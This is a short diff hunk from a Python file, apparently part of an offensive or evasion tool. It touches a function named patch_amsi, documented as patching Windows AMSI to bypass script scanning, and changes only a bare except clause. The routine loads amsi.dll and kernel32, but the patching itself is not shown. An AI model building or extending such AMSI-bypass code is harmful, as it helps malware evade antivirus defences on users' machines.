@@ -635,7 +635,7 @@ def patch_amsi():
     """Patch AMSI to bypass script scanning"""
     try:
         amsi = ctypes.windll.LoadLibrary("amsi.dll")
-    except:
+    except Exception:
         return False  # AMSI not loaded
     
     kernel32 = ctypes.windll.kernel32
